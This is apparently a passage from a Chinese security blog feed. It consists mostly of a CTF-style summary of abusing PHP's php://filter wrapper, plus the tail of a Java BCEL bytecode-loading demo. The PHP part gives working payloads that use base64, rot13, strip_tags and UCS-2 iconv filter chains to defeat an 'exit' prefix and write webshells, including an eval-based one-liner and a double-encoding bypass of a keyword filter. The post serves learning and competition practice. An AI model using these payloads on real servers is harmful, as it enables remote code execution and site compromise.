<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> Repository.lookupClass(Test.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(clazz.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机：</p>
<p><img src="/2024/06/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240622012629497.png" alt="image-20240622012629497"></p>
<p>代码为什么要这样构造其实已经比较清楚了，可以自己想想流程来对比一下。</p>
<p>还有的就是这里JDK7运行需要改idea的配置，为了能测试成功改了，但是后面又改回来了，刚好防止自己忘，可以参考文章来改：<code>https://blog.csdn.net/weixin_46001244/article/details/108601584</code></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java基础</category>
        <category>动态加载字节码</category>
      </categories>
  </entry>
  <entry>
    <title>filter过滤器利用总结</title>
    <url>/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
<span id="more"></span>

<h3 id="对php-filter的说明"><a href="#对php-filter的说明" class="headerlink" title="对php://filter的说明"></a>对<code>php://filter</code>的说明</h3><h5 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h5><p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
<p>基本格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=?/resource=?</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource</td>
<td>在<code>php://filter</code>中，<code>resource</code>参数是必须的。<code>resource</code>用于指定<code>需要进行筛选过滤的数据流</code></td>
</tr>
<tr>
<td>read</td>
<td><code>read</code>参数指定<code>一个或多个过滤器</code>用于<code>读</code>操作，多个过滤器之间以管道符&#96;</td>
</tr>
<tr>
<td>write</td>
<td><code>write</code>参数指定<code>一个或多个过滤器</code>用于<code>写</code>操作，多个过滤器之间以管道符&#96;</td>
</tr>
<tr>
<td>无read或write为前缀</td>
<td>任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链</td>
</tr>
</tbody></table>
<p>注意：任何没有与<code>read=</code>或<code>write=</code>作前缀的筛选器列表会<code>视情况应用于读或写操作</code>。这意味着在指定筛选器的过程中，<code>read</code>与<code>write</code>参数可被忽略。</p>
<h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p>以<code>file_get_contents()</code>函数为例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#flag&#123;123ahdiuahd&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#ZmxhZ3sxMjNhaGRpdWFoZH0=</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#synt&#123;123nuqvhnuq&#125;</span></span><br></pre></td></tr></table></figure>

<p>以<code>file_put_contents()</code>函数为例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/resource=11.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#11.txt文件内容：hello world</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=convert.base64-encode/resource=12.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#12.txt文件内容：aGVsbG8gd29ybGQ=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=13.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#13.txt文件内容：uryyb jbeyq</span></span><br></pre></td></tr></table></figure>



<h5 id="重要过滤器"><a href="#重要过滤器" class="headerlink" title="重要过滤器"></a><strong>重要过滤器</strong></h5><h6 id="string-strip-tags："><a href="#string-strip-tags：" class="headerlink" title="string.strip_tags："></a>string.strip_tags：</h6><p>简单说明：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" alt="image-20240522172738818"></p>
<p>注意：这里虽然说是php7.3.0后废除，但是看了看网上在线的php官方文档&#x3D;&#x3D;直到php8.0还没有完全废弃</p>
<p>使用此过滤器等同于用<a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" alt="image-20240521145500302"></p>
<p>这里的标签包含诸如<code>&lt;html&gt;</code>、**<code>&lt;haha</code>**或者<code>&lt;?</code>等标志都会被去除掉，测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里用函数<span class="title function_ invoke__">strip_tags</span>()来演示：</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;ha&gt;haha&lt;/aher&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：haha</span></span><br><span class="line"><span class="number">2</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了，这是因为虽然不是一个标准的HTML标签，但任然符合标签格式，所以都被当做了html标签被删除</span></span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了</span></span><br><span class="line"><span class="number">4</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;</span></span><br><span class="line"><span class="number">5</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125; &gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全删</span></span><br><span class="line"><span class="number">6</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?php htmlhahaha-flag=&#123;adgaiudgiuag&#125;?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全部被删除，php元素应该是会全部被删除</span></span><br></pre></td></tr></table></figure>

<p><strong>说明一下区别：</strong></p>
<ul>
<li><p>2和3区别： 为什么<code>&lt;haha</code>也会全部被删除，这是因为当调用<code>strip_tags()</code>时，它会执行以下操作，</p>
<p>（1）它会从左到右扫描字符串，找到第一个<code>&lt;</code>，</p>
<p>（2）继续扫描直到找到<code>&gt;</code>，<strong>在此过程中，所有字符都被认为是标签的一部分</strong>。</p>
<p>（3）移除标签：将<code>&lt;</code>和<code>&gt;</code>之间的所有内容删除。</p>
</li>
<li><p>2与3区别：</p>
</li>
<li></li>
</ul>
<p>清晰明了。</p>
<ul>
<li><p>4和5区别：空格位置不同导致结果也不同，这就有html中的标签和属性有关了，首先，标签名称不能包含空格，但是标签属性部分可以包含空格，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>则在这里:</p>
<p>（1）<code>&lt;a&gt;</code>是标签名称，表示一个超链接元素，</p>
<p>（2）<code>href=&quot;https://example.com&quot;</code> 是一个属性，指定链接的目标 URL。</p>
<p>（3）<code>target=&quot;_blank&quot;</code> 是另一个属性，指定链接打开的方</p>
</li>
</ul>
<p>所以标签名称前面是不能有空格的，后面有没有无所谓，就算有空格都只是被当做标签名称与属性分隔的地方。</p>
<p><strong>这里一定要注意：</strong></p>
<ul>
<li><p><code>&lt;</code>对应<code>&gt;</code>代表结束，<code>&lt;?</code>一定要有<code>?&gt;</code>才代表结束</p>
</li>
<li><p>php元素（<code>&lt;?</code>）没有前面必须没有空格的说法，只要是这在这两个相对应的符号之间的内容全部都会被去除</p>
</li>
</ul>
<h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*:"></a>convert.iconv.*:</h6><p>这个过滤器需要<code>php</code>支持<code>iconv</code>。而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
<p><code>iconv</code>——将字符串按要求的字符编码来转换</p>
<p><code>convert.iconv.*</code>有两种使用方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>

<p>可用的字符编码：（其他可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>

<p>等如压缩过滤器的其他过滤器的利用可以自己去看</p>
<h6 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h6><p>比如有的时候会对过滤器进行过滤，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); </span><br></pre></td></tr></table></figure>

<p><strong>此时有个小知识点</strong>：伪协议处理时会对过滤器<code>urldecode</code>过滤一次。</p>
<p>所以可以利用二次编码绕过，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php</span><br></pre></td></tr></table></figure>

<p>可以直接在burp上使用<code>URL-encode all characters</code>对其进行URL全编码,主要是要将字符也编码。</p>
<p>并且在自己的搭建的环境也成功测试。</p>
<h3 id="利用编码解码来’模糊’代码"><a href="#利用编码解码来’模糊’代码" class="headerlink" title="利用编码解码来’模糊’代码"></a>利用编码解码来’模糊’代码</h3><p>这里以文件包含的<code>死亡exit()</code>绕过为例子，比如有下面的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。</p>
<p>但是注意，<code>file_put_content()</code>函数是可以使用php:&#x2F;&#x2F;filter，同时这里的<code>$_POST[&#39;filename&#39;]</code>是可以被控制为传入的参数为伪协议的，那么我们就可以在这里尝试做文章。</p>
<p>思路：只要将<code>content</code>前面部分的那段代码使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就行，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的。</p>
<h4 id="利用base64编码"><a href="#利用base64编码" class="headerlink" title="利用base64编码"></a>利用base64编码</h4><p>使用<code>php://filter</code>流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p><strong>核心原理</strong>：Base64编码中只包含64个可打印字符，而PHP在解码Base64时，遇到不在其中的字符时，将会跳过这些字符，键将合法字符组成一个进的字符串进行解码。</p>
<p>所以，一个正常的<code>base64_decode</code>实际上可以理解为如下两个步骤。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>所以，当<code>$content</code>被加上了<code>&lt;?php  exit; ?&gt;</code>以后，当使用<code>php://filter/write=convert.base64-decode</code>对其解码，<strong>在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等字符会因为不符合base64编码的字符范围被忽略，所以最终被解码的字符仅有<code>phpexit</code>和我们传入的其他字符。</strong></p>
<p><code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加一个”a”一共8个字符。这样，<code>phpexita</code>被正常解码，而后面我们传入的webshell的base64内容页被正常解码，结果就是<code>&lt;?php exit;?&gt;</code>没有了。</p>
<p><strong>最后效果</strong></p>
<p>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" alt="image-20240521191114493"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" alt="image-20240521191420996"></p>
<h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p><strong>条件</strong>：<code>short_open_tag = off</code>,即不开启短标签（也许默认为On，自己的配置就是）</p>
<p>原理和上面类似，核心是将“死亡exit”去除，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启<code>short_open_tag</code>时，php不认识这个字符串，当然也就不会执行。</p>
<p><strong>最后效果</strong></p>
<p>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" alt="image-20240521194945000"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" alt="image-20240521195044746"></p>
<p><strong>同时经测试，将条件改为On，不能执行。</strong></p>
<h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>这里就需要用到上面阐述过的<code>string.strip_tags</code>，在测试代码中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，就可以利用<code>strip_tags</code>函数去除它，而<code>php://filter</code>是支持这个方法的，</p>
<p>已经阐述过<code>string.strip_tags</code>过滤器会过滤的东西，那么我们可以直接尝试这样构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=12.txt&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了防止想传入的数据也被去除掉，所以这里也将内容编码一下</span></span><br></pre></td></tr></table></figure>

<p><strong>最后效果</strong></p>
<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" alt="image-20240521201629726"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" alt="image-20240521201701528"></p>
<p><strong>这个方法的做题记录：</strong><br>写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" alt="image-20240521202558001"></p>
<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" alt="image-20240521202621401"></p>
<h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br></pre></td></tr></table></figure>

<p>第一种情况已经在上面已经有比较清楚的说明，先在来说说第二种情况。</p>
<h5 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h5><p>这里对应第二种情况，bypass的方法如下</p>
<h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p><strong>首先有个知识点：</strong><code>=</code>在base64中的作用是填充，也就是意味着结束；在<code>=</code>的后面是不允许有其他任何字符的，否则会报错，并且这样会导致无法正常写入文件的。测试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+=.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>运行过后没有写入文件，2.txt文件为空。再改一下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>成功向2.txt文件写入东西</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" alt="image-20240522131121762"></p>
<p>确实存在这个问题，<strong>需要注意</strong></p>
<p>——————</p>
<p>常规可想到的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>

<p><code>content</code>拼接过后的内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>

<p>此时就有一个问题<strong>，<code>=</code>的问题</strong>，需要使用一个方法将其去掉这里考虑<code>string.strip_tags</code>过滤器，如下构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#注意，这里需要将&#x27;+&#x27;URL编码为%2B,防止被浏览器当做空格处理</span></span><br></pre></td></tr></table></figure>

<p>此时拼接后的语句可以**配合到php前后对应的标签被去除只剩下<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>**，再被base64解码形成想要执行的字符串并填入到文件中，如下测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>成功执行（生成了一个文件，文件名为<code>?&gt;PD9waHAgcGhwaW5mbygpOz8%2b.php</code>，但是没有内容），估计是系统问题</p>
<p>但是由于文件名不正常，想读就必须加上引号，但是在浏览器访问的时候访问不到看（引号问题），不好读，这里可以尝试将其改变为一个正常的文件名，这里采用<strong>伪目录的方法</strong>（这里将<code>resource</code>后面前面的base64字符和闭合的符号整体看做一个目录，但是由于没有这个目录，于是就撤回到了原目录，可以生成我们能够访问的文件名），于是构建如下payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../haha.php</span></span><br></pre></td></tr></table></figure>

<p>这样可以构建出haha.php，文件，内容为<code>&lt;?php phpinfo();?&gt;</code>，原理我是get到了，但是本地搭没测试出来，怪，等有题的时候再试试。</p>
<h6 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h6><p>首先rot13编码不受限于<code>=</code>,并且条件同样为之前那个（<code>short_open_tag = off</code>），这样才不会被PHP识别为代码。</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span></span><br><span class="line"></span><br><span class="line">content=php:<span class="comment">//filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</span></span><br></pre></td></tr></table></figure>

<p><strong>对于第一个payload个人理解（重要，后面对于这种构造方法利用的比较多）</strong>：第一个payload将我们想要利用的字符串放进了了过滤器列表里面，个人猜测是php程序在运行这串代码时会找有没有这个过滤器，没有就直接跳过舍弃。</p>
<p>测试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">传入的payload:</span><br><span class="line">php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br><span class="line"> 拼接完后即是：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>;php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br></pre></td></tr></table></figure>

<p>最终结果：<br>成功写入：</p>
<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" alt="image-20240522194848128"></p>
<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" alt="image-20240522194907522"></p>
<h6 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h6><p>对于<code>iconv</code>字符编码转换进行绕过的手法，类似于上面所述的<code>rot13</code>方法，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。（注意：不出意外的话应该是只有类似”同族“的编码方式才能这样转换）</p>
<ul>
<li><strong>usc-2</strong></li>
</ul>
<p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），<strong>也就是说构造的恶意代码的字节数需要是UCS-2中2的倍数</strong>，不然不能进行正常反转</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment"># ?&lt;hp phpipfn(o;)&gt;? 从转换结果就可以看出来是如何转换的，为什么要是2的倍数 同时注意包裹要转换的字符串必须是单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span> <span class="comment">#一句话木马</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?</span></span><br></pre></td></tr></table></figure>

<p>payload(其实都差不多了感觉):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>最后效果：</p>
<p>成功写入：</p>
